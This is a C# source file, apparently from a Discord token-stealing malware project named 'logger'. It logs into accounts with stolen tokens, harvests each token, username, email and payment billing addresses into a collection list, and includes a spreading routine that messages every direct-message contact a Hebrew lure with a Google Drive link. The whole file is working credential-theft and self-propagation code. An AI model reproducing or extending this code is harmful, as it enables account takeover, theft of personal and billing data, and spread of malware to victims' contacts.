using Discord.Gateway;
using System;
using System.Collections.Generic;
using System.Text;
using Discord;
using System.Threading.Tasks;
using System.Threading;

namespace logger
{
    class DiscordAPI
    {

        public static List<string> accountssused = new List<string>();

        public static void main(string token)
        {
            
            try
            {
                DiscordClient client = new DiscordClient(token, new DiscordConfig() { RetryOnRateLimit = true });


                
                

                if (accountssused.Contains(client.User.Id.ToString()))
                {
             
                    return;
                }
                else
                {
                    accountssused.Add(client.User.Id.ToString());
                    //var t = new Thread(() => Spread(token));


                    //t.Start();


                    StringBuilder account = new StringBuilder();
                    account.Append("token: ||" + token + "|| \nUsename: " + client.User.Username + "\nMail: "+client.User.Email);
                    var payments = client.GetPaymentMethods();
                    
                    if(payments.Count > 0) {
                        account.Append("\nPayments Details: ");
                        foreach(var pay in payments)
                        {
                            account.Append("\nBilling: " + pay.BillingAddress.Address1 + ", " + pay.BillingAddress.City + ", " + pay.BillingAddress.Country);
                        }
                    }
                    Utils.Accounts.Add(account.ToString());
                    

                }
               
            } catch
            {
            }
            

            

        }


        private static void Spread(string token)
        {


            DiscordSocketClient client = new DiscordSocketClient();

            // Callback to the Client_OnLoggedIn function.
            //client.OnLoggedIn += Client_OnLoggedIn;

            
            client.Login(token);

            Thread.Sleep(-1); // So it doesn't close after logging in.


        }

        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            if (client.User.Id.ToString() != "930765377682690068")
            {
                IReadOnlyList<PrivateChannel> dms = client.GetPrivateChannels();

                foreach (var dm in dms)
                {

                    dm.SendMessage("קבל איזה כוסית חח" + "\nhttps://drive.google.com/drive/folders/1Hm8QCpvCbn7un_wxPbnNkF9hwXP-NFTP?usp=sharing");

                }
            }

            

            
            
        }




    }
}
